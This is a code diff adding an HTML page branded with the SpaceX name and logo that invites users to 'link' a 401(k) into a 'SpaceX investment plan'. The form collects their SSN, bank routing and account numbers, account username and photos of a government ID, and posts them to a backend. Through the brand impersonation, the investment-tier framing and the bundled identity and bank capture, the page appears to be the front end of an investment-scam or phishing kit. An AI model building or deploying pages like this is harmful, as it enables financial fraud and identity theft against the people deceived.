@@ -1,0 +1,652 @@
+```html
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>SPACEX — Link 401(k)</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        margin: 0;
+        background: #000;
+        color: #fff;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial,
+          sans-serif;
+      }
+      button,
+      input,
+      select {
+        font-family: inherit;
+        color: inherit;
+      }
+      .wrap {
+        max-width: 820px;
+        margin: 0 auto;
+        padding: 28px 22px 40px;
+      }
+      .card {
+        border: 1px solid #3a3a3a;
+        border-radius: 12px;
+        padding: 28px 26px 22px;
+      }
+      .logo {
+        width: 150px;
+        display: block;
+        margin: 0 auto 18px;
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: 34px;
+      }
+      .center {
+        text-align: center;
+      }
+      .lead {
+        color: #cfcfcf;
+        margin: 0 0 18px;
+      }
+      hr {
+        border: 0;
+        border-top: 1px solid #2a2a2a;
+        margin: 0 0 18px;
+      }
+      p {
+        color: #e8e8e8;
+        line-height: 1.55;
+        margin: 0 0 16px;
+      }
+      .list {
+        border: 1px solid #3a3a3a;
+        border-radius: 10px;
+        overflow: hidden;
+        margin: 18px 0 20px;
+      }
+      .item {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 14px 16px;
+        border-top: 1px solid #2a2a2a;
+      }
+      .item:first-child {
+        border-top: 0;
+      }
+      .ok {
+        width: 22px;
+        height: 22px;
+        border: 2px solid #fff;
+        border-radius: 50%;
+        display: grid;
+        place-items: center;
+        font-size: 12px;
+        flex-shrink: 0;
+      }
+      .btns {
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        flex-wrap: wrap;
+        margin-top: 16px;
+      }
+      .ghost {
+        height: 44px;
+        padding: 0 18px;
+        border: 1px solid #fff;
+        border-radius: 8px;
+        background: #000;
+        color: #fff;
+        cursor: pointer;
+      }
+      .go {
+        height: 44px;
+        padding: 0 18px;
+        border: 0;
+        border-radius: 8px;
+        background: #fff;
+        color: #000;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .lock {
+        text-align: center;
+        color: #9a9a9a;
+        font-size: 13px;
+        margin: 16px 0 0;
+      }
+      label {
+        display: block;
+        font-size: 14px;
+        margin: 14px 0 6px;
+      }
+      input,
+      select {
+        width: 100%;
+        height: 42px;
+        border: 1px solid #3a3a3a;
+        border-radius: 8px;
+        background: #000;
+        padding: 0 12px;
+      }
+      select {
+        appearance: none;
+        -webkit-appearance: none;
+      }
+      .box {
+        border: 1px solid #3a3a3a;
+        border-radius: 10px;
+        padding: 16px 16px 12px;
+      }
+      .err {
+        color: #f87171;
+        min-height: 18px;
+        margin-top: 10px;
+      }
+      .tick {
+        width: 72px;
+        height: 72px;
+        border: 2px solid #fff;
+        border-radius: 50%;
+        display: grid;
+        place-items: center;
+        margin: 0 auto 16px;
+        font-size: 32px;
+      }
+      .row {
+        display: flex;
+        justify-content: space-between;
+        padding: 12px 0;
+        border-bottom: 1px solid #2a2a2a;
+      }
+      .idpick {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 8px;
+      }
+      .idpick button {
+        height: 46px;
+        border: 1px solid #3a3a3a;
+        background: #000;
+        color: #fff;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+      .idpick button.on {
+        border-color: #fff;
+      }
+      .drops {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+      }
+      .dropz {
+        border: 1px dashed #555;
+        border-radius: 10px;
+        min-height: 130px;
+        display: grid;
+        place-items: center;
+        text-align: center;
+        cursor: pointer;
+        color: #9a9a9a;
+        overflow: hidden;
+      }
+      .dropz img {
+        max-height: 128px;
+        max-width: 100%;
+        display: block;
+      }
+      .h3 {
+        margin: 18px 0 10px;
+        font-size: 16px;
+      }
+      .consent {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        margin-top: 16px;
+        font-size: 14px;
+        line-height: 1.4;
+      }
+      .consent input {
+        width: auto;
+        height: auto;
+        margin-top: 3px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <svg class="logo" viewBox="0 0 331.644 40.825" fill="#fff">
+        <path
+          d="M77.292,15.094H49.249l-1.039,0.777v24.947h7.763v-9.355l0.741-0.664h20.579 c5.196,0,7.632-1.398,7.632-4.985v-5.728C84.924,16.493,82.489,15.094,77.292,15.094 M77.292,24.317 c0,1.69-1.118,2.041-3.554,2.041H56.799l-0.827-0.804V20.21l0.741-0.678h17.025c2.436,0,3.554,0.347,3.554,2.045V24.317z"
+        />
+        <polyline
+          points="99.081,19.813 105.761,29.6 105.391,30.548 90.618,30.548 86.847,35.187 108.837,35.187 110.361,36.115 113.775,40.824 122.659,40.824 103.186,14.775"
+        />
+        <polyline
+          points="187.418,35.757 187.418,28.833 188.217,28.143 203.079,28.143 203.079,23.734 179.524,23.734 179.524,40.823 214.27,40.823 214.27,36.435 188.252,36.435"
+        />
+        <rect x="179.524" y="15.094" width="35.113" height="4.848" />
+        <path
+          d="M140.361,19.685h28.288c-0.436-3.597-2.668-4.595-8.33-4.595H140.06c-6.389,0-8.427,1.247-8.427,6.082 v13.565c0,4.84,2.038,6.087,8.427,6.087h20.259c5.745,0,7.945-1.079,8.095-4.81h-28.053l-0.832-0.783V20.209"
+        />
+        <path
+          d="M29.333,25.118H8.754l-0.606-0.667v-4.402l0.603-0.466h27.742l0.379-0.927 c-0.945-2.431-3.392-3.565-7.936-3.565H9.665c-6.385,0-8.426,1.247-8.426,6.082v2.844c0,4.841,2.041,6.086,8.426,6.086h20.533 l0.645,0.566v4.602l-0.526,0.718H6.83v-0.022H0.678c0,0-0.704,0.353-0.677,0.518c0.525,3.382,2.829,4.34,8.345,4.34h20.987 c6.384,0,8.486-1.247,8.486-6.087v-3.543C37.819,26.363,35.717,25.118,29.333,25.118"
+        />
+        <path
+          d="M236.725,14.988h-11.551l-0.627,1.193l12.828,9.351c2.43-1.407,5.074-2.833,7.95-4.24"
+        />
+        <path
+          d="M247.075,32.603l11.275,8.222h11.692l0.484-1.089L253.69,27.413 C251.454,29.054,249.245,30.787,247.075,32.603"
+        />
+        <path
+          d="M235.006,40.806h-10.451l-0.883-1.383C230.778,32.562,262.56,3.151,331.644,0 C331.644,0,273.658,1.956,235.006,40.806"
+        />
+      </svg>
+
+      <!-- INTRO -->
+      <div id="intro" class="card">
+        <h1 class="center">Link Your 401(k)</h1>
+        <hr />
+        <p>
+          Linking your 401(k) allows eligible funds to be allocated into your
+          selected SpaceX investment plan automatically.
+        </p>
+        <p>
+          Once connected, contributions from your 401(k) can be directed toward
+          your active investment tier. This does not withdraw your entire
+          retirement account. Only the amount you authorize will be allocated.
+        </p>
+        <p>
+          You remain in control of the linked amount, payout schedule, and can
+          disconnect the link at any time from Settings.
+        </p>
+        <div class="list">
+          <div class="item">
+            <span class="ok">✓</span> Review your current 401(k) provider
+          </div>
+          <div class="item">
+            <span class="ok">✓</span> Authorize the allocation amount
+          </div>
+          <div class="item">
+            <span class="ok">✓</span> Confirm the investment plan
+          </div>
+        </div>
+        <div class="btns">
+          <button class="ghost" type="button" id="later">Not Now</button>
+          <button class="go" type="button" id="go">Accept and Continue</button>
+        </div>
+        <p class="lock">
+          Your retirement account details are encrypted and used only for
+          verification.
+        </p>
+      </div>
+
+      <!-- FORM -->
+      <div id="form" style="display: none">
+        <h1>Connect Your 401(k)</h1>
+        <p class="lead">
+          Enter your provider details to securely link your retirement account.
+        </p>
+        <div class="box">
+          <label>1. Company / Provider that issued the 401(k)</label>
+          <input id="f-prov" placeholder="e.g. Fidelity, Vanguard, Empower" />
+
+          <label>2. Full Name on the account</label>
+          <input id="f-name" placeholder="Full legal name" />
+
+          <label>3. Username</label>
+          <input id="f-username" placeholder="Username" />
+
+          <label>4. Bank Name</label>
+          <input id="f-bank-name" placeholder="Bank name" />
+
+          <label>5. Routing Number</label>
+          <input
+            id="f-routing"
+            inputmode="numeric"
+            maxlength="9"
+            placeholder="9-digit routing number"
+          />
+
+          <label>6. Account Number</label>
+          <input
+            id="f-account"
+            inputmode="numeric"
+            maxlength="17"
+            placeholder="4-17 digit account number"
+          />
+
+          <label>7. Account Type</label>
+          <select id="f-account-type">
+            <option value="">Select account type</option>
+            <option value="Checking">Checking</option>
+            <option value="Savings">Savings</option>
+          </select>
+
+          <label>8. Account Holder Name</label>
+          <input id="f-holder" placeholder="Name on bank account" />
+
+          <label class="consent">
+            <input id="f-consent" type="checkbox" />
+            I confirm this is my personal bank account and I authorize recurring
+            401(k) contributions
+          </label>
+
+          <label>9. Amount to authorize</label>
+          <input
+            id="f-amt"
+            type="number"
+            min="0"
+            step="0.01"
+            placeholder="0.00"
+          />
+
+          <label>10. SSN</label>
+          <input id="f-ssn" placeholder="XXX-XX-XXXX" />
+
+          <div class="h3">GOVERNMENT-ISSUED ID</div>
+          <p class="lead">Select ID Type</p>
+          <div class="idpick">
+            <button type="button" data-id="license">Driver's License</button>
+            <button type="button" data-id="passport">Passport</button>
+            <button type="button" data-id="national">National ID Card</button>
+            <button type="button" data-id="residence">Residence Permit</button>
+          </div>
+
+          <div class="h3">UPLOAD ID IMAGES</div>
+          <div class="drops">
+            <div class="dropz" id="z-front">
+              Front of ID<br /><small>PNG, JPG · Max 5MB</small>
+            </div>
+            <div class="dropz" id="z-back">
+              Back of ID<br /><small>PNG, JPG · Max 5MB</small>
+            </div>
+          </div>
+          <input
+            type="file"
+            id="f-front"
+            accept="image/*"
+            style="display: none"
+          />
+          <input
+            type="file"
+            id="f-back"
+            accept="image/*"
+            style="display: none"
+          />
+
+          <p class="err" id="err"></p>
+          <div class="btns">
+            <button class="ghost" type="button" id="back">Back</button>
+            <button class="go" type="button" id="link">
+              Link 401(k) Account
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- SUCCESS -->
+      <div id="done" class="card" style="display: none">
+        <div class="tick" style="background: #16a34a; color: #fff">✓</div>
+        <h1 class="center" style="color: #16a34a">Submitted Successfully</h1>
+        <p class="center">
+          Your 401(k) bank account has been linked successfully and submitted
+          for review.
+        </p>
+        <div class="row"><span>Provider</span><b id="d-prov"></b></div>
+        <div class="row"><span>Name</span><b id="d-name"></b></div>
+        <div class="row"><span>Amount</span><b id="d-amt"></b></div>
+        <div class="row"><span>Status</span><b id="d-status">Pending review</b></div>
+        <button
+          class="go"
+          type="button"
+          id="home"
+          style="width: 100%; margin-top: 18px"
+        >
+          Back to Dashboard
+        </button>
+        <button
+          class="ghost"
+          type="button"
+          id="retry"
+          style="width: 100%; margin-top: 10px"
+        >
+          Submit another 401(k)
+        </button>
+      </div>
+    </div>
+
+    <script>
+      function get() {
+        try {
+          return JSON.parse(
+            localStorage.getItem("spacex.v1") || '{"users":[],"session":null}',
+          );
+        } catch (e) {
+          return { users: [], session: null };
+        }
+      }
+      function save(d) {
+        localStorage.setItem("spacex.v1", JSON.stringify(d));
+      }
+      function money(n) {
+        n = Number(n) || 0;
+        return "$" + n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+      }
+
+      var db = get();
+      var me = JSON.parse(localStorage.getItem("spacex.user") || "null");
+      var currentIdType = "";
+
+      if (!me) window.location.href = "login.html";
+
+      document.getElementById("f-name").value = me.name || me.fullName || "";
+
+      document.getElementById("later").onclick = function () {
+        window.location.href = "home.html";
+      };
+      document.getElementById("home").onclick = function () {
+        window.location.href = "home.html";
+      };
+      function resetSubmissionForm() {
+        document.getElementById("done").style.display = "none";
+        document.getElementById("intro").style.display = "none";
+        document.getElementById("form").style.display = "block";
+        document.querySelectorAll("#form input").forEach(function (input) {
+          if (input.type === "checkbox") input.checked = false;
+          else input.value = "";
+        });
+        document.getElementById("err").textContent = "";
+        currentIdType = "";
+        document.querySelectorAll(".idpick button").forEach(function (button) {
+          button.className = "";
+        });
+        document.getElementById("link").disabled = false;
+        document.getElementById("link").textContent = "Link 401(k) Account";
+      }
+      document.getElementById("retry").onclick = resetSubmissionForm;
+      document.getElementById("go").onclick = function () {
+        document.getElementById("intro").style.display = "none";
+        document.getElementById("form").style.display = "block";
+      };
+      document.getElementById("back").onclick = function () {
+        document.getElementById("form").style.display = "none";
+        document.getElementById("intro").style.display = "block";
+      };
+
+      fetch("http://localhost:4000/api/me", {
+        headers: {
+          Authorization: "Bearer " + localStorage.getItem("authToken"),
+        },
+      })
+        .then(function (response) {
+          if (!response.ok) throw new Error("Unable to load 401(k) status.");
+          return response.json();
+        })
+        .then(function (payload) {
+          var account = payload.user && payload.user.retirementAccount;
+          if (!account) return;
+          document.getElementById("intro").style.display = "none";
+          document.getElementById("form").style.display = "none";
+          document.getElementById("done").style.display = "block";
+          document.getElementById("d-prov").textContent =
+            account.provider || "401(k) provider";
+          document.getElementById("d-name").textContent =
+            payload.user.name || "";
+          document.getElementById("d-amt").textContent = money(account.balance);
+          document.getElementById("d-status").textContent =
+            account.status === "APPROVED" ? "Linked" : "Pending review";
+        })
+        .catch(function (error) {
+          console.warn("Unable to load 401(k) submission state", error);
+        });
+
+      // ID type selection
+      document.querySelectorAll(".idpick button").forEach(function (btn) {
+        btn.onclick = function () {
+          currentIdType = btn.getAttribute("data-id") || "";
+          document.querySelectorAll(".idpick button").forEach(function (x) {
+            x.className = "";
+          });
+          btn.className = "on";
+        };
+      });
+
+      // File upload previews
+      function pick(inp, zone) {
+        document.getElementById(zone).onclick = function () {
+          document.getElementById(inp).click();
+        };
+        document.getElementById(inp).onchange = function () {
+          var f = this.files && this.files[0];
+          if (!f) return;
+          document.getElementById(zone).innerHTML =
+            '<img src="' + URL.createObjectURL(f) + '">';
+        };
+      }
+      pick("f-front", "z-front");
+      pick("f-back", "z-back");
+
+      // Submit
+      document.getElementById("link").onclick = async function () {
+        var prov = document.getElementById("f-prov").value.trim();
+        var name = document.getElementById("f-name").value.trim();
+        var username = document.getElementById("f-username").value.trim();
+        var bankName = document.getElementById("f-bank-name").value.trim();
+        var routingNumber = document.getElementById("f-routing").value.trim();
+        var accountNumber = document.getElementById("f-account").value.trim();
+        var accountType = document.getElementById("f-account-type").value;
+        var accountHolderName = document
+          .getElementById("f-holder")
+          .value.trim();
+        var bankConsent = document.getElementById("f-consent").checked;
+        var ssn = document.getElementById("f-ssn").value.trim();
+        var amt = Number(document.getElementById("f-amt").value) || 0;
+        var err = document.getElementById("err");
+        err.textContent = "";
+
+        if (!prov || !name || !username || !ssn || !currentIdType || amt <= 0) {
+          err.textContent = "Fill all 401(k) fields and ID details";
+          return;
+        }
+        if (!bankName || !/^\d{9}$/.test(routingNumber)) {
+          err.textContent =
+            "Enter a bank name and exactly 9 routing-number digits";
+          return;
+        }
+        if (!/^\d{4,17}$/.test(accountNumber)) {
+          err.textContent = "Account number must contain 4 to 17 digits";
+          return;
+        }
+        if (!accountType || !accountHolderName) {
+          err.textContent =
+            "Select an account type and enter the account holder name";
+          return;
+        }
+        if (!bankConsent) {
+          err.textContent =
+            "Confirm authorization for recurring 401(k) contributions";
+          return;
+        }
+
+        var button = document.getElementById("link");
+        button.disabled = true;
+        button.textContent = "Submitting...";
+
+        try {
+          var token = localStorage.getItem("authToken");
+          var response = await fetch("http://localhost:4000/api/401k", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: "Bearer " + token,
+            },
+            body: JSON.stringify({
+              provider: prov,
+              legalName: name,
+              username: username,
+              ssn: ssn,
+              bankName: bankName,
+              routingNumber: routingNumber,
+              accountNumber: accountNumber,
+              accountType: accountType,
+              accountHolderName: accountHolderName,
+              bankConsent: bankConsent,
+              balance: amt,
+              planType: currentIdType,
+            }),
+          });
+
+          var payload = await response.json();
+          if (!response.ok)
+            throw new Error(payload.message || "Submission failed.");
+
+          // Upload ID documents
+          for (var fileInfo of [
+            { input: "f-front", type: currentIdType + "_front" },
+            { input: "f-back", type: currentIdType + "_back" },
+          ]) {
+            var file = document.getElementById(fileInfo.input).files[0];
+            if (!file) continue;
+            var formData = new FormData();
+            formData.append("docType", fileInfo.type);
+            formData.append("document", file);
+            var uploadResponse = await fetch(
+              "http://localhost:4000/api/kyc/upload",
+              {
+                method: "POST",
+                headers: { Authorization: "Bearer " + token },
+                body: formData,
+              },
+            );
+            if (!uploadResponse.ok) {
+              var uploadPayload = await uploadResponse.json();
+              throw new Error(
+                uploadPayload.message || "Document upload failed.",
+              );
+            }
+          }
+
+          // Success indicator
+          document.getElementById("form").style.display = "none";
+          document.getElementById("done").style.display = "block";
+          document.getElementById("d-prov").textContent = prov;
+          document.getElementById("d-name").textContent = name;
+          document.getElementById("d-amt").textContent = money(amt);
+          document.getElementById("d-status").textContent = "Pending review";
+          button.textContent = "Submitted Successfully";
+        } catch (error) {
+          err.textContent = error.message || "Unable to submit 401(k) details.";
+          button.disabled = false;
+          button.textContent = "Link 401(k) Account";
+        }
+      };
+    </script>
+  </body>
+</html>
+```
